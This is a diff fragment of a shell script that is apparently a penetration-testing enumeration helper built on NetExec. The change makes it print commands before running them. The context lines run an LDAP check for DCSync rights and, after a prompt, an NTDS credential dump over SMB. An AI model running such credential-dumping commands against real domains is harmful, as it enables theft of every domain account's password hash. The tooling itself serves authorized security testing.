+        print_cmd "nxc ldap $IP $USER_FLAG -M daclread -o TARGET_DN=\"$domain_dn\" ACTION=read RIGHTS=DCSync"
         unbuffer nxc ldap $IP $USER_FLAG -M daclread -o TARGET_DN="$domain_dn" ACTION=read RIGHTS=DCSync 2>/dev/null | tee nxc-enum/ldap/dcsync-rights.txt
         
         echo -e "\n\033[96m[+] What these checks reveal:\033[0m"
@@ -1563,6 +1678,7 @@ if [ "$os_type" = "windows" ] && [ -n "$user" ]; then
     
     if [[ "$response" =~ ^[Yy]$ ]]; then
         echo -e "\n\033[91m[+] Running NTDS Dump...\033[0m\n"
+        print_cmd "nxc smb $IP $USER_FLAG --ntds"
         unbuffer nxc smb $IP $USER_FLAG --ntds | tee nxc-enum/smb/ntds-dump.txt
     else
         echo -e "\033[93m[!] NTDS dump skipped (timed out or declined)\033[0m"
